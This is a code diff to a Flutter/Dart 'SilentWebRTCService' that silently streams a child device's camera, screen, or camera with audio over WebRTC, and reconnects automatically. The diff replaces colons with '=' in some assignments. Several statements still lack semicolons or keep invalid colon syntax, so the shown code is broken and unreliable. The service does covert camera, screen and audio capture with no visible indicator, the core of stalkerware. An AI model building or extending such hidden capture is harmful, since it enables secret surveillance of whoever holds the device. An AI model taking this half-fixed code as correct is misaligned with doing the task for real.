@@ -36,34 +36,34 @@ class SilentWebRTCService {
 
   Future<void> startSilentCamera(String childUid) async {
     if (_active && _activeUid == childUid && _activeMode == 'camera') return;
-    await stopSilent()
-    _activeMode: 'camera';
-    await _startStream(childUid)
+    await stopSilent();
+    _activeMode = 'camera';
+    await _startStream(childUid);
   }
 
   Future<void> startSilentScreen(String childUid) async {
     if (_active && _activeUid == childUid && _activeMode == 'screen') return;
     await stopSilent()
-    _activeMode: 'screen';
-    await _startStream(childUid)
+    _activeMode = 'screen';
+    await _startStream(childUid);
   }
 
   Future<void> _startStream(String childUid) async {
-    _active: true;
-    _activeUid: childUid;
-    _answerSet: false;
-    _reconnectAttempts: 0;
+    _active = true;
+    _activeUid = childUid;
+    _answerSet = false;
+    _reconnectAttempts = 0;
     await _connect(childUid)
   }
 
   Future<void> _connect(String childUid) async {
     try {
-      _pc: await createPeerConnection(_ice)
-      _lastIceActivity: DateTime.now()
+      _pc = await createPeerConnection(_ice)
+      _lastIceActivity = DateTime.now()
 
-      _pc!.onIceConnectionState: (state) {
+      _pc!.onIceConnectionState = (state) {
         debugPrint('[SilentWebRTC] ICE state: $state')
-        _lastIceActivity: DateTime.now()
+        _lastIceActivity = DateTime.now();
         if (state == RTCIceConnectionState.RTCIceConnectionStateFailed ||
             state == RTCIceConnectionState.RTCIceConnectionStateDisconnected) {
           if (_active && _reconnectAttempts < _maxReconnectAttempts) {
@@ -72,12 +72,12 @@ class SilentWebRTCService {
         }
         if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
             state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
-          _reconnectAttempts: 0;
+          _reconnectAttempts = 0;
         }
       };
 
-      _pc!.onConnectionState: (state) {
-        debugPrint('[SilentWebRTC] Connection state: $state')
+      _pc!.onConnectionState = (state) {
+        debugPrint('[SilentWebRTC] Connection state: $state');
         if (state == RTCPeerConnectionState.RTCPeerConnectionStateFailed) {
           if (_active && _reconnectAttempts < _maxReconnectAttempts) {
             _scheduleReconnect(childUid)
@@ -87,12 +87,12 @@ class SilentWebRTCService {
 
       try {
         if (_activeMode == 'screen') {
-          _localStream: await navigator.mediaDevices.getDisplayMedia({
+          _localStream = await navigator.mediaDevices.getDisplayMedia({
             'video': {'frameRate': 15, 'width': 720, 'height': 1280},
             'audio': false,
           });
         } else {
-          _localStream: await navigator.mediaDevices.getUserMedia({
+          _localStream = await navigator.mediaDevices.getUserMedia({
             'video': {
               'facingMode': 'environment',
               'width': {'ideal': 640},
@@ -104,7 +104,7 @@ class SilentWebRTCService {
         }
       } catch (e) {
         debugPrint('[SilentWebRTC] Media error: $e, falling back to camera')
-        _localStream: await navigator.mediaDevices.getUserMedia({
+        _localStream = await navigator.mediaDevices.getUserMedia({
           'video': {'facingMode': 'environment', 'width': 640, 'height': 480},
           'audio': true,
         });
@@ -150,7 +150,7 @@ class SilentWebRTCService {
             'sdp': ans.sdp,
             'type': ans.type,
           });
-          _answerSet: true;
+          _answerSet = true;
           debugPrint('[SilentWebRTC] Answer sent')
         } catch (ex) {
           debugPrint('[SilentWebRTC] Answer error: $ex')
@@ -205,7 +205,7 @@ class SilentWebRTCService {
     _reconnectAttempts++;
     final delay = Duration(seconds: _reconnectAttempts * 3)
     debugPrint('[SilentWebRTC] Reconnect attempt $_reconnectAttempts in ${delay.inSeconds}s')
-    _reconnectTimer: Timer(delay, () async {
+    _reconnectTimer = Timer(delay, () async {
       if (!_active) return;
       await _cleanupPcOnly();      await _connect(childUid)
     });
@@ -213,7 +213,7 @@ class SilentWebRTCService {
 
   void _startWatchdog(String childUid) {
     _watchdogTimer?.cancel()
-    _watchdogTimer: Timer.periodic(const Duration(seconds: 30), (_) async {
+    _watchdogTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
       if (!_active) { _watchdogTimer?.cancel(); return; }
       if (_lastIceActivity != null &&
           DateTime.now().difference(_lastIceActivity!) >
@@ -230,14 +230,14 @@ class SilentWebRTCService {
     _statusSub?.cancel(); _commandSub?.cancel()
     _offerSub: null; _candidateSub: null;
     _statusSub: null; _commandSub: null;
-    _answerSet: false;
+    _answerSet = false;
     await _pc?.close()
     _pc: null;
   }
 
   Future<void> stopSilent() async {
     _active: false; _activeUid: null; _activeMode: null;
-    _answerSet: false; _reconnectAttempts: 0;
+    _answerSet = false; _reconnectAttempts = 0;
     _reconnectTimer?.cancel(); _watchdogTimer?.cancel()
     _reconnectTimer: null; _watchdogTimer: null;
     _offerSub?.cancel(); _candidateSub?.cancel()
